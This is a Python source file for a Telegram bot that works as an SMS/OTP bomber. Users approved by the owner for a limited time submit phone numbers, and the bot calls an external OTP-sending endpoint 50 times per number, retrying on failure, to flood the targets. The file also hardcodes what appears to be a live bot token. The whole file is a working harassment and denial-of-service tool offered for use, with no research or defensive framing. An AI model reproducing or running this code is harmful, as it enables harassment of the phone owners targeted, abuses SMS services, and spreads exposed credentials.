import time
import requests
from datetime import datetime, timedelta
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# Replace with your bot token
BOT_TOKEN = "7709293848:AAEVl_7pO1Jy4nwNe_0fiJ1iVme38suDWFY"
OTP_API_URL = "https://otp.glitchy.workers.dev/send?phone={phone}"
OWNER_ID = 7202072688  # Replace with the Telegram ID of the bot owner

# State for conversation handler
ASK_PHONES = range(1)

# Authorized users and expiry dates
authorized_users = {}

# Helper function to check if a user is authorized
def is_authorized(user_id):
    return user_id in authorized_users and authorized_users[user_id] > datetime.now()


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text(
            "❌ You are not authorized to use this bot. Please contact the owner for access."
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "Welcome to the OTP Bot!\n\nPlease provide the phone numbers separated by commas to send OTPs (e.g., `+1234567890, +9876543210`).",
        parse_mode=ParseMode.MARKDOWN,
    )
    return ASK_PHONES


async def ask_phones(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send 50 OTPs to each phone number with a 5-second gap."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text(
            "❌ You are not authorized to use this bot. Please contact the owner for access."
        )
        return ConversationHandler.END

    try:
        # Parse phone numbers
        phone_numbers = [phone.strip() for phone in update.message.text.split(",")]

        # Notify the user that processing is starting
        await update.message.reply_text(
            f"Starting to send OTPs to the following numbers:\n\n{', '.join(phone_numbers)}",
            parse_mode=ParseMode.MARKDOWN,
        )

        # Send OTPs to each phone number
        for phone_number in phone_numbers:
            await update.message.reply_text(
                f"🚀 Sending OTPs to *{phone_number}*...",
                parse_mode=ParseMode.MARKDOWN,
            )

            for i in range(50):  # Send 50 OTPs
                response = requests.get(OTP_API_URL.format(phone=phone_number))
                if response.status_code == 200 and response.json().get("status") == 1:
                    await update.message.reply_text(
                        f"✅ OTP {i + 1}/50 successfully sent to {phone_number}.",
                        parse_mode=ParseMode.MARKDOWN,
                    )
                else:
                    await update.message.reply_text(
                        f"⚠️ Failed to send OTP {i + 1}/50 to {phone_number}. Retrying...",
                        parse_mode=ParseMode.MARKDOWN,
                    )
                    # Retry up to 3 times
                    retries = 3
                    success = False
                    for retry in range(retries):
                        time.sleep(2)  # Wait before retrying
                        retry_response = requests.get(OTP_API_URL.format(phone=phone_number))
                        if retry_response.status_code == 200 and retry_response.json().get("status") == 1:
                            success = True
                            await update.message.reply_text(
                                f"✅ OTP {i + 1}/50 successfully sent to {phone_number} on retry {retry + 1}.",
                                parse_mode=ParseMode.MARKDOWN,
                            )
                            break
                    if not success:
                        await update.message.reply_text(
                            f"❌ Giving up on OTP {i + 1}/50 for {phone_number} after {retries} retries.",
                            parse_mode=ParseMode.MARKDOWN,
                        )
                        break

                # Wait 1 second between each OTP
                time.sleep(1)

            # Notify the user after completing 50 OTPs for the number
            await update.message.reply_text(
                f"🎉 Completed sending 50 OTPs to *{phone_number}*. Waiting 5 seconds before the next number.",
                parse_mode=ParseMode.MARKDOWN,
            )
            time.sleep(5)

        await update.message.reply_text(
            "✅ All OTPs have been sent successfully to all provided phone numbers.",
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception as e:
        await update.message.reply_text(
            f"❌ An error occurred: `{str(e)}`",
            parse_mode=ParseMode.MARKDOWN,
        )

    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the conversation."""
    await update.message.reply_text(
        "Operation canceled. If you want to start over, type /start."
    )
    return ConversationHandler.END


async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command for the owner to approve users."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    try:
        args = context.args
        if len(args) != 2:
            await update.message.reply_text(
                "❌ Invalid format. Use `/approve <user_id> <duration>` (e.g., `/approve 123456789 1D`)."
            )
            return

        user_to_approve = int(args[0])
        duration = args[1]

        if duration.endswith("D"):
            days = int(duration[:-1])
            expiry_date = datetime.now() + timedelta(days=days)
        elif duration.endswith("H"):
            hours = int(duration[:-1])
            expiry_date = datetime.now() + timedelta(hours=hours)
        else:
            await update.message.reply_text(
                "❌ Invalid duration format. Use `D` for days or `H` for hours (e.g., `1D` or `12H`)."
            )
            return

        authorized_users[user_to_approve] = expiry_date
        await update.message.reply_text(
            f"✅ User {user_to_approve} has been approved until {expiry_date}."
        )
    except Exception as e:
        await update.message.reply_text(f"❌ An error occurred: `{str(e)}`")


def main():
    """Main function to set up the bot."""
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Conversation handler with states
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PHONES: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phones)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # Add handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("approve", approve))

    # Start the bot
    application.run_polling()


if __name__ == "__main__":
    main()
